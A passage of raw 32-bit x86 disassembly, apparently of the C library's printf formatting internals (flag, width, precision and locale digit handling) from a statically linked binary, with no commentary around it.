cmp edi, 0x10
je 0x8066b92
mov ebx, dword [var_4bch]
mov edx, dword [var_500h]
sub ebx, esi
lea eax, [edx + ebx]
sub dword [var_4fch], eax
test edx, edx
jle 0x8066b40
mov dword [var_8h], edx
mov dword [var_4h], 0x30
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], eax
mov eax, dword [var_4fch]
test eax, eax
jle 0x80661b6
mov eax, dword [var_4fch]
mov dword [esp], edi
mov dword [var_4h], 0x20
mov dword [var_8h], eax
call fcn.08075680
jmp 0x80661b0
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x8066bf3
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_506h]
mov edx, dword [ecx + 0x14]
cmp edx, dword [ecx + 0x18]
jae 0x8066be2
mov byte [edx], al
mov edi, dword [arg_8h]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [var_4b0h]
sub dword [var_4fch], 2
jmp 0x8066b08
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8066bc9
mov dword [var_4h], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x8066ba6
jmp 0x8064cc0
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x8066adf
jmp 0x8064cc0
mov ecx, dword [var_4e4h]
test ecx, ecx
je 0x8066c4e
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066c44
mov byte [eax], 0x2b
jmp 0x8066ad9
mov dword [var_4h], 0x2b
jmp 0x8066c13
mov edx, dword [var_4dch]
test edx, edx
je 0x8066aeb
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066c6f
mov byte [eax], 0x20
jmp 0x8066ad9
mov dword [var_4h], 0x20
jmp 0x8066c13
dec esi
mov byte [esi], 0x30
jmp 0x8066870
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066840
mov edx, dword [var_4bch]
dec esi
mov byte [edx - 1], 0x30
jmp 0x8066840
xor eax, eax
cmp byte [var_506h], 0x58
mov dword [var_8h], edi
sete al
mov dword [esp + 0xc], eax
mov ecx, dword [var_4bch]
mov dword [var_4h], ecx
mov esi, dword [var_4d4h]
mov dword [esp], esi
call fcn.08063c00
mov esi, eax
mov eax, dword [var_4e8h]
test eax, eax
je 0x8066d03
mov eax, dword [var_4ach]
test eax, eax
je 0x8066d03
mov eax, dword [var_4a8h]
mov dword [esp], eax
mov eax, esi
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov eax, dword [var_504h]
test eax, eax
je 0x8066840
cmp edi, 0xa
jne 0x8066840
mov edx, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08063f40
mov esi, eax
jmp 0x8066840
mov dword [var_500h], 1
jmp 0x8066ca0
cmp dword [var_500h], 4
mov eax, 5
mov esi, 0x80a0a39
cmovg eax, dword [var_500h]
mov dword [var_500h], eax
jmp 0x80663a0
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x80663aa
mov ebx, dword [var_4f4h]
test ebx, ebx
jne case.0x80671e9.57
mov ecx, dword [var_4e0h]
dec dword [var_4fch]
test ecx, ecx
jne 0x8066dbe
mov edx, dword [var_4fch]
test edx, edx
jle 0x8066dbe
mov edi, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov ecx, dword [arg_8h]
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov edx, dword [ecx + 0x14]
movzx eax, byte [eax]
cmp edx, dword [ecx + 0x18]
jae 0x8066e21
mov byte [edx], al
mov esi, dword [arg_8h]
inc dword [esi + 0x14]
inc eax
je 0x8064cc0
mov eax, dword [var_4e0h]
inc dword [var_4b0h]
test eax, eax
je 0x80661b6
mov eax, dword [var_4fch]
test eax, eax
jle 0x80661b6
mov edi, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
jmp 0x8066b88
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8066ddb
lea ebx, [var_43ch]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_500h]
rep stosd dword es:[edi], eax
movsx eax, byte [var_506h]
mov ecx, dword [var_4fch]
mov dword [var_43ch], edx
movzx edx, byte [var_4f0h]
mov dword [var_438h], ecx
movzx ecx, byte [var_4f4h]
mov dword [var_434h], eax
add edx, edx
shl ecx, 2
movzx eax, byte [var_430h]
and eax, 0xfffffffc
or eax, dword [var_4ech]
or eax, edx
movzx edx, byte [var_4d8h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_4dch]
shl edx, 3
or eax, edx
movzx edx, byte [var_4e0h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_4e4h]
shl edx, 5
or eax, edx
movzx edx, byte [var_4e8h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
shl edx, 7
or eax, edx
movzx edx, byte [var_504h]
mov byte [var_430h], al
movzx eax, byte [var_42fh]
shl edx, 3
and eax, 0xfffffff7
or eax, edx
mov byte [var_42fh], al
movzx eax, byte [var_505h]
mov dword [var_42ch], eax
mov eax, dword [var_4ech]
test eax, eax
je 0x8066f59
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_454h], eax
mov dword [var_4h], ebx
lea eax, [var_454h]
mov dword [var_8h], eax
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08067f60
jmp 0x80661a1
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x8066f2f
mov edi, 0x10
mov eax, dword [var_4ech]
xor ebx, ebx
mov dword [var_4e4h], 0
mov dword [var_4dch], 0
test eax, eax
je 0x80670b8
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax]
mov ecx, dword [eax + 4]
mov dword [var_4d4h], edx
mov dword [var_4d0h], ecx
cmp dword [var_500h], 0
jl 0x80670a9
mov byte [var_505h], 0x20
jne 0x806700e
mov ecx, dword [var_4d0h]
or ecx, dword [var_4d4h]
jne 0x806700e
cmp edi, 8
mov esi, dword [var_4bch]
je 0x8066ff7
mov eax, dword [var_4d4h]
or eax, dword [var_4d0h]
setne al
movzx eax, al
mov dword [var_4d4h], eax
jmp 0x8066840
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066fda
mov eax, dword [var_4bch]
dec esi
mov byte [eax - 1], 0x30
jmp 0x8066fda
xor eax, eax
cmp byte [var_506h], 0x58
mov dword [esp + 0xc], edi
sete al
mov dword [var_10h_2], eax
mov edx, dword [var_4bch]
mov dword [var_8h], edx
mov edx, dword [var_4d0h]
mov eax, dword [var_4d4h]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08063ca0
mov ecx, dword [var_4e8h]
mov esi, eax
test ecx, ecx
je 0x8067079
mov edx, dword [var_4ach]
test edx, edx
je 0x8067079
mov edx, dword [var_4a8h]
mov dword [esp], edx
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov eax, dword [var_504h]
test eax, eax
je 0x8066fda
cmp edi, 0xa
jne 0x8066fda
mov ecx, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h], ecx
call fcn.08063f40
mov esi, eax
jmp 0x8066fda
mov dword [var_500h], 1
jmp 0x806700e
mov esi, dword [var_4f8h]
test esi, esi
je 0x80670d7
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_4d4h], eax
jmp 0x8066809
mov ecx, dword [var_4f0h]
test ecx, ecx
jne 0x80670ec
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x80670cc
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x80670cc
mov edi, 8
jmp 0x8066f6f
mov edi, 0xa
jmp 0x8066f6f
mov eax, dword [var_4ech]
mov edi, 0xa
test eax, eax
je 0x8067146
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov ebx, edx
shr ebx, 0x1f
je 0x8067135
neg eax
adc edx, 0
neg edx
mov dword [var_4d4h], eax
mov dword [var_4d0h], edx
jmp 0x8066fab
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov edx, eax
mov ebx, eax
neg edx
shr ebx, 0x1f
cmovne eax, edx
jmp 0x80670cc
mov esi, dword [arg_8h]
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x806717f
mov byte [eax], 0x25
mov edi, dword [arg_8h]
inc dword [edi + 0x14]
inc dword [var_4b0h]
jmp 0x80661b6
mov dword [var_4h], 0x25
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067174
jmp 0x8064cc0
mov dword [var_4ech], 1
mov dword [var_4f4h], 1
mov eax, dword [var_44ch]
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0e60]
jmp edx
mov dword [var_4f0h], 0
mov dword [var_4f8h], 1
jmp 0x80671ab
mov dword [var_4ech], 0
mov dword [var_4f4h], 0
jmp 0x80671ab
jmp case.0x8067365.59
mov eax, dword [var_44ch]
mov dword [var_4f4h], 1
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0de0]
jmp edx
mov eax, dword [var_44ch]
mov dword [var_4f0h], 1
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0d60]
jmp edx
mov ecx, dword [var_44ch]
lea edx, [ecx + 1]
mov dword [var_44ch], edx
movzx eax, byte [ecx + 1]
cmp al, 0x2a
je 0x8067462
movzx eax, al
mov dword [var_500h], 0
sub eax, 0x30
cmp eax, 9
jbe 0x8067449
mov eax, dword [var_4fch]
cmp dword [var_500h], eax
jle 0x8067331
mov ebx, dword [var_500h]
add ebx, 0x20
cmp ebx, 0x3e8
jle 0x8067331
cmp ebx, 0x1000
ja 0x806740e
mov eax, dword [var_500h]
mov edx, dword [var_500h]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_23h_2]
and eax, 0xfffffff0
lea eax, [edx + eax + 0x20]
mov dword [var_4bch], eax
mov eax, dword [var_44ch]
mov edx, case.0x80643c0.32
movzx eax, byte [eax]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0ce0]
jmp edx
mov dword [var_504h], 1
jmp 0x80643d0
lea eax, [var_44ch]
mov dword [esp], eax
call fcn.08064110
mov ebx, eax
mov dword [var_4fch], eax
add ebx, 0x20
cmp ebx, 0x3e7
jle 0x80673c4
cmp ebx, 0x1000
ja 0x80673da
mov eax, dword [var_4fch]
mov esi, dword [var_4fch]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_23h_2]
and eax, 0xfffffff0
lea eax, [esi + eax + 0x20]
mov dword [var_4bch], eax
mov eax, dword [var_44ch]
movzx eax, byte [eax]
cmp al, 0x24
jne 0x8064547
jmp 0x80648c5
mov dword [esp], ebx
call fcn.0807adb0
test eax, eax
jne 0x806739f
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov dword [var_4b8h], eax
je 0x8064cc0
mov edi, dword [var_4fch]
lea edi, [edi + eax + 0x20]
mov dword [var_4bch], edi
jmp 0x80673c4
mov dword [esp], ebx
call fcn.0807adb0
test eax, eax
jne 0x806730c
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov dword [var_4b8h], eax
je 0x8064cc0
mov ecx, dword [var_500h]
lea ecx, [ecx + eax + 0x20]
mov dword [var_4bch], ecx
jmp 0x8067331
lea eax, [var_44ch]
mov dword [esp], eax
call fcn.08064110
mov dword [var_500h], eax
jmp 0x80672e1
lea edx, [ecx + 2]
mov dword [var_44ch], edx
mov dword [var_450h], edx
movzx eax, byte [ecx + 2]
sub eax, 0x30
cmp eax, 9
jbe 0x80674a3
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_500h], eax
jns 0x80672e1
mov dword [var_500h], 0xffffffff
jmp 0x80672e1
lea eax, [var_450h]
mov dword [esp], eax
call fcn.08064110
test eax, eax
je 0x806747d
mov eax, dword [var_450h]
cmp byte [eax], 0x24
jne 0x806747d
jmp 0x80648c5
mov dword [esp], eax
call fcn.0807adb0
test eax, eax
jne 0x806484d
mov eax, dword [var_568h]
cmp dword [var_564h], eax
cmovge eax, dword [var_564h]
add eax, 0x20
mov dword [esp], eax
call fcn.08050fe0
mov edx, dword [var_568h]
cmp dword [var_564h], edx
mov dword [var_574h], eax
mov ecx, dword [var_574h]
mov eax, edx
cmovge eax, dword [var_564h]
lea eax, [eax + ecx + 0x20]
mov dword [var_4bch], eax
jmp 0x806488a
mov dword [esi + edx], 0xffffffff
jmp 0x8064802
neg eax
or ebx, 0x20
mov byte [esi + ecx + 0xc], bl
mov dword [esi + ecx + 4], eax
mov dword [var_548h], 1
jmp 0x80647c0
mov esi, dword [var_574h]
mov dword [esp], esi
call fcn.08051180
jmp 0x806462e
mov dword [esp], ebx
call fcn.0807adb0
test eax, eax
jne 0x8064519
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov dword [var_4b8h], eax
je 0x8064cc0
mov ecx, dword [var_4fch]
lea ecx, [ecx + eax + 0x20]
mov dword [var_4bch], ecx
jmp 0x806453e
neg eax
mov byte [var_505h], 0x20
mov dword [var_4e0h], 1
mov dword [var_4fch], eax
jmp 0x80644fc
lea eax, [var_448h]
mov dword [esp], eax
call fcn.08064110
test eax, eax
je 0x80644e5
mov eax, dword [var_448h]
cmp byte [eax], 0x24
jne 0x80644e5
jmp 0x80648c5
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08074540
jmp 0x8064279
mov ecx, 0xffffffff
mov dword [eax], 0x16
jmp 0x80641ce
mov dword [eax], 9
jmp 0x80641ce
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov eax, dword [arg_ch]
mov esi, dword [arg_8h]
mov dword [var_10h], esp
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
cmp ecx, edx
mov eax, edx
cmovge eax, ecx
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
and eax, 0xfffffff0
cmp ecx, edx
cmovge edx, ecx
lea eax, [edx + eax + 0x20]
mov dword [var_14h], eax
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067936
mov byte [eax], 0x25
inc dword [esi + 0x14]
mov edx, dword [var_ch]
mov edi, 1
movzx eax, byte [edx + 0xc]
test al, 8
je 0x806768a
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067915
mov byte [eax], 0x23
inc dword [esi + 0x14]
mov edx, dword [var_ch]
mov edi, 2
movzx eax, byte [edx + 0xc]
test al, 0x80
je 0x80676a8
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80678f9
mov byte [eax], 0x27
inc dword [esi + 0x14]
mov edx, dword [var_ch]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x80678d7
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80678bb
mov byte [eax], 0x2b
inc dword [esi + 0x14]
mov edx, dword [var_ch]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x20
je 0x80676e1
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x806789f
mov byte [eax], 0x2d
inc dword [esi + 0x14]
inc edi
mov eax, dword [var_ch]
cmp dword [eax + 0x10], 0x30
je 0x8067873
mov edx, dword [var_ch]
test byte [edx + 0xd], 8
je 0x806770a
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067857
mov byte [eax], 0x49
inc dword [esi + 0x14]
inc edi
mov eax, dword [var_ch]
mov eax, dword [eax + 4]
test eax, eax
jne 0x80677ef
mov eax, dword [var_ch]
cmp dword [eax], 0xffffffff
je 0x806777d
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80677d6
mov byte [eax], 0x2e
inc dword [esi + 0x14]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
inc edi
mov edx, dword [var_14h]
mov dword [var_4h], edx
mov edx, dword [var_ch]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08063c00
cmp eax, dword [var_14h]
mov ebx, eax
jae 0x806777d
mov esi, esi
movsx eax, byte [ebx]
mov edx, dword [esi + 0x14]
inc ebx
cmp edx, dword [esi + 0x18]
jae 0x80677c5
mov byte [edx], al
inc dword [esi + 0x14]
movzx eax, al
inc eax
je 0x80677ad
inc edi
cmp ebx, dword [var_14h]
jb 0x8067760
mov edx, dword [var_ch]
mov eax, dword [edx + 8]
test eax, eax
je 0x80677a0
mov edx, dword [esi + 0x14]
cmp edx, dword [esi + 0x18]
jae 0x80677b4
mov byte [edx], al
inc dword [esi + 0x14]
movzx eax, al
inc eax
je 0x80677ad
inc edi
nop
lea esi, [esi]
mov eax, edi
mov esp, dword [var_10h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
mov edi, 0xffffffff
jmp 0x80677a0
movzx eax, al
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8067797
movzx eax, al
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8067774
mov dword [var_4h], 0x2e
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067732
jmp 0x80677ad
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov edx, dword [var_14h]
mov dword [var_4h], edx
mov edx, dword [var_ch]
mov eax, dword [edx + 4]
mov dword [esp], eax
call fcn.08063c00
cmp eax, dword [var_14h]
mov ebx, eax
jae 0x8067718
nop
movsx eax, byte [ebx]
mov edx, dword [esi + 0x14]
inc ebx
cmp edx, dword [esi + 0x18]
jae 0x8067846
mov byte [edx], al
inc dword [esi + 0x14]
movzx eax, al
inc eax
je 0x80677ad
inc edi
cmp ebx, dword [var_14h]
jb 0x8067820
jmp 0x8067718
movzx eax, al
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8067834
mov dword [var_4h], 0x49
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067709
jmp 0x80677ad
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067887
mov byte [eax], 0x30
inc dword [esi + 0x14]
inc edi
jmp 0x80676ee
mov dword [var_4h], 0x30
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067881
jmp 0x80677ad
mov dword [var_4h], 0x2d
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x80676e0
jmp 0x80677ad
mov dword [var_4h], 0x2b
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x80676c2
jmp 0x80677ad
test al, 0x10
je 0x80676ca
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80678ef
mov byte [eax], 0x20
jmp 0x80676bf
mov dword [var_4h], 0x20
jmp 0x80678c3
mov dword [var_4h], 0x27
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x80676a0
jmp 0x80677ad
mov dword [var_4h], 0x23
mov dword [esp], esi
mov edi, 0xffffffff
call fcn.0804d840
inc eax
jne 0x806767e
jmp 0x80677a0
mov dword [var_4h], 0x25
mov dword [esp], esi
mov edi, 0xffffffff
call fcn.0804d840
inc eax
jne 0x806765c
jmp 0x80677a0
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x18
mov eax, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_10h], edx
mov dword [esp], eax
call fcn.08053400
mov edx, dword [var_14h]
mov dword [var_18h], eax
movzx eax, byte [edx]
cmp al, 0x7f
je 0x8067a00
test al, al
jle 0x8067a00
inc edx
movsx esi, al
mov dword [var_14h], edx
mov edx, dword [var_10h]
sub edx, ebx
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea edi, [var_1bh]
mov dword [var_4h], ebx
mov dword [var_8h], edx
and edi, 0xfffffff0
mov dword [esp], edi
call fcn.08053740
mov ebx, dword [var_10h]
cmp eax, edi
mov ecx, eax
jbe 0x8067a00
dec ecx
dec ebx
dec esi
movzx eax, byte [ecx]
mov byte [ebx], al
jne 0x80679f7
cmp ecx, edi
jbe 0x8067a00
mov edx, dword [var_18h]
mov esi, dword [arg_8h]
dec edx
dec ebx
test edx, edx
movzx eax, byte [edx + esi]
mov byte [ebx], al
jg 0x80679d2
mov edx, dword [var_14h]
movzx eax, byte [edx]
cmp al, 0x7f
je 0x8067a15
test al, al
jl 0x8067a15
je 0x8067a0c
inc dword [var_14h]
movsx esi, al
cmp ecx, edi
ja 0x80679c1
nop
lea esi, [esi]
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [var_14h]
movsx esi, byte [eax - 1]
jmp 0x80679f7
dec ecx
dec ebx
movzx eax, byte [ecx]
cmp ecx, edi
mov byte [ebx], al
ja 0x8067a15
jmp 0x8067a00
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
mov eax, dword [ebx + 0x14]
mov edx, dword [ebx + 0x10]
mov edi, dword [ebx + 0x98]
mov ecx, eax
sub ecx, edx
jne 0x8067a8b
cmp eax, dword [ebx + 0x18]
jae 0x8067a71
mov edx, esi
mov byte [eax], dl
inc dword [ebx + 0x14]
movzx eax, dl
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov edx, esi
mov dword [arg_8h], ebx
mov edi, dword [var_4h]
movzx eax, dl
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov dword [arg_ch], eax
leave
jmp fcn.0804d840
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], ecx
call dword [eax + 0x1c]
mov edx, dword [ebx + 0x14]
sub edx, eax
mov dword [ebx + 0x14], edx
mov eax, edx
jmp 0x8067a57
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
lea ebx, [ebp - 0x20cc]
sub esp, 0x20e4
mov edi, dword [eax + 0x5c]
test edi, edi
jne 0x8067ad7
mov dword [eax + 0x5c], 0xffffffff
mov edi, 0xffffffff
cmp edi, 0xffffffff
mov eax, 0xffffffff
jne 0x8067bb0
lea eax, [ebp - 0x200c]
mov dword [ebp - 0x2034], esi
mov dword [ebp - 0x2070], 0xffffffff
mov dword [ebp - 0x20b8], eax
mov dword [ebp - 0x20bc], eax
mov dword [ebp - 0x20cc], 0xfbad8004
lea eax, [var_ch]
mov dword [ebp - 0x2084], 0
mov dword [ebp - 0x2038], 0x80a0f60
mov dword [ebp - 0x20b4], eax
mov dword [var_8h], ecx
mov dword [var_4h], edx
mov dword [esp], ebx
call fcn.08064160
mov dword [ebp - 0x20e0], eax
mov eax, 0
test eax, eax
setne al
movzx eax, al
test eax, eax
mov dword [ebp - 0x20e4], eax
jne 0x8067bef
cmp word [esi], 0
jns 0x8067be2
mov ebx, dword [ebp - 0x20b8]
mov edx, dword [ebp - 0x20bc]
sub ebx, edx
test ebx, ebx
jle 0x8067b9a
mov eax, dword [esi + 0x94]
mov dword [var_8h], ebx
mov dword [var_4h], edx
mov dword [esp], esi
call dword [eax + 0x1c]
cmp eax, ebx
cmove edi, dword [ebp - 0x20e0]
mov dword [ebp - 0x20e0], edi
cmp word [esi], 0
jns 0x8067bd8
mov eax, dword [ebp - 0x20e4]
test eax, eax
jne 0x8067bc0
mov eax, dword [ebp - 0x20e0]
add esp, 0x20e4
pop ebx
pop esi
pop edi
leave
ret
nop
lea esi, [esi]
lea eax, [ebp - 0x20dc]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x8067baa
mov dword [esp], esi
call fcn.08074580
jmp 0x8067ba0
mov dword [esp], esi
call fcn.08074540
jmp 0x8067b65
lea eax, [ebp - 0x20dc]
mov dword [var_8h], esi
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
jmp 0x8067b5f
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x44
mov edi, dword [arg_8h]
mov dword [esp], 0x80a09c4
call fcn.0807ac80
mov dword [esp], 0x2e
mov dword [var_38h], eax
mov dword [var_4h], eax
call fcn.0807ad50
mov esi, eax
mov dword [esp], 0x2c
mov eax, dword [var_38h]
mov dword [var_4h], eax
call fcn.0807ad50
mov edx, dword [var_38h]
mov dword [var_3ch], eax
test edx, edx
jne 0x8067d76
mov edx, dword [arg_ch]
sub edx, edi
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_4h], edi
mov dword [var_8h], edx
and eax, 0xfffffff0
mov dword [var_40h], eax
mov dword [esp], eax
call fcn.08053740
mov esi, eax
mov edi, dword [arg_ch]
dec esi
cmp esi, dword [var_40h]
jb 0x8067d26
movzx edx, byte [esi]
lea eax, [edx - 0x30]
cmp al, 9
ja 0x8067d37
movsx eax, dl
lea ebx, [eax - 0x30]
cmp ebx, 9
ja 0x8067de1
mov eax, 0
test eax, eax
je 0x8067d30
mov dword [esp], 3
call section.
mov eax, dword [eax]
lea edx, [ebx + 0x29]
and edx, 0xffff
mov ebx, dword [eax + edx*4 + 0x24]
mov dword [esp], ebx
call fcn.08053400
mov ecx, edi
mov edx, eax
sub ecx, eax
dec edx
test eax, eax
je 0x8067d1e
movzx eax, byte [edx + ebx]
mov byte [edx + ecx], al
mov eax, edx
dec edx
test eax, eax
jne 0x8067d10
mov edi, ecx
dec esi
cmp esi, dword [var_40h]
jae 0x8067cc0
lea esp, [var_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8067cee
mov eax, dword [var_38h]
test eax, eax
jne 0x8067d43
dec edi
mov byte [edi], dl
jmp 0x8067d20
cmp dl, 0x2e
je 0x8067d71
cmp dl, 0x2c
jne 0x8067d3e
lea ebx, [var_2ch]
mov dword [esp], ebx
call fcn.08053400
mov edx, eax
sub edi, eax
dec edx
test eax, eax
je 0x8067d20
movzx eax, byte [edx + ebx]
mov byte [edx + edi], al
mov eax, edx
dec edx
test eax, eax
jne 0x8067d61
jmp 0x8067d20
lea ebx, [var_1ch]
jmp 0x8067d50
lea ebx, [var_34h]
lea eax, [var_1ch]
mov dword [var_34h], 0
mov dword [var_30h], 0
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08077b00
mov dword [var_8h], ebx
inc eax
mov edx, 0x2e
mov dword [var_34h], 0
cmovne dx, word [var_1ch]
mov eax, dword [var_3ch]
mov dword [var_30h], 0
mov dword [var_4h], eax
lea eax, [var_2ch]
mov word [var_1ch], dx
mov dword [esp], eax
call fcn.08077b00
inc eax
mov edx, 0x2c
cmovne dx, word [var_2ch]
mov word [var_2ch], dx
jmp 0x8067c8e
mov dword [var_sp_ch], str.outdigit_value
mov dword [var_8h], 0x24
mov dword [var_4h], str..._locale_outdigits.h
mov dword [esp], str.0___n__n___9
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push esi
push ebx
mov ebx, ecx
sub esp, 0x1c
mov dword [var_ch], ecx
